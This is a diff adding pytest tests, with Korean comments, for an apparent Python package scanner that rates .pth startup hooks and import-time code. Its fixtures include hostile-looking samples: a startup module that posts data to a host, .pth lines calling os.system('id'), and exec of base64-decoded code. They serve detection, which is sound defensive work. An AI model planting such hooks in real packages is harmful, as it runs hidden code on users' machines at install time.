@@ -1254,3 +1254,38 @@ def test_entrypoint_downloader_alone_is_normal(cmd, high):
              "p-1/p/__init__.py": "",
              "p-1/p/cli.py": f"import subprocess\ndef main(url='u', f='o'):\n    {cmd}\n"}
     assert (RULE_ENTRYPOINT in {f.rule for f in analyze_files(files)}) is high
+
+
+# ── 신규 업로드 실측 오탐 (docs/eval/watch-new-uploads.md) ──────────────────
+
+_WHEEL = {"p-1.dist-info/WHEEL": "Wheel-Version: 1.0\n"}
+
+
+def _pth(files: dict[str, str]):
+    return [f for f in analyze_files(files) if f.rule == RULE_PTH]
+
+
+def test_pth_importing_own_module_is_medium_and_module_is_still_checked():
+    """dagz·quantark 등 — 자기 배포물 모듈을 import 하는 한 줄은 의도된 시작 훅이다.
+    대신 그 모듈의 최상단은 (휠 루트 단일 모듈이어도) import 시점 코드로 검사한다."""
+    files = {**_WHEEL, "zzzz_p_bootstrap.pth": "import _p_startup\n",
+             "_p_startup.py": "x = 1\n"}
+    [f] = _pth(files)
+    assert f.severity is Severity.MEDIUM
+    files["_p_startup.py"] = "import requests\nrequests.post('http://x', data='h')\n"
+    assert RULE_INSTALL_TIME in {f.rule for f in analyze_files(files)
+                                 if f.severity is Severity.HIGH}
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "import _p_startup; _p_startup.go()",          # 인라인 코드가 붙음
+        "import os, subprocess; os.system('id')",
+        "import evil_not_in_this_dist",                 # 같은 배포물에 없는 모듈
+        "import base64;exec(base64.b64decode('aWQ='))",
+    ],
+)
+def test_pth_with_code_or_foreign_import_stays_high(line):
+    files = {**_WHEEL, "x.pth": line + "\n", "_p_startup.py": "x = 1\n"}
+    assert [f.severity for f in _pth(files)] == [Severity.HIGH]
